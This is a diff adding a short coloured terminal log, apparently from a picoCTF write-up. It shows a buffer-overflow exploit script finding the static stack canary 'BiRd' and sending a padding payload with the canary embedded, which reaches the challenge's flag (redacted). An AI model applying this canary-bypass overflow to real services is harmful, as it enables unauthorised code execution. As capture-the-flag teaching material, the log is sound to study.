@@ -1,0 +1,9 @@
+<span style="color:#DC3958">$</span> python3 buffer-overflow-3.py
+[<span style="color:#47D4B9"><b>+</b></span>] Finding canary: 'BiRd'
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port 57427: Done
+[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (162B)
+[<span style="color:#277FFF"><b>*</b></span>] Closed connection to saturn.picoctf.net port 57427
+[<span style="color:#47D4B9"><b>+</b></span>] aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaBiRdraaasaaataa-
+auaaa6^H
+    Ok... Now Where&apos;s the Flag?
+    picoCTF{Stat1C_c4n4r13s_4R3_b4D_<span style="color:#696969"><b>[REDACTED]</b></span>}
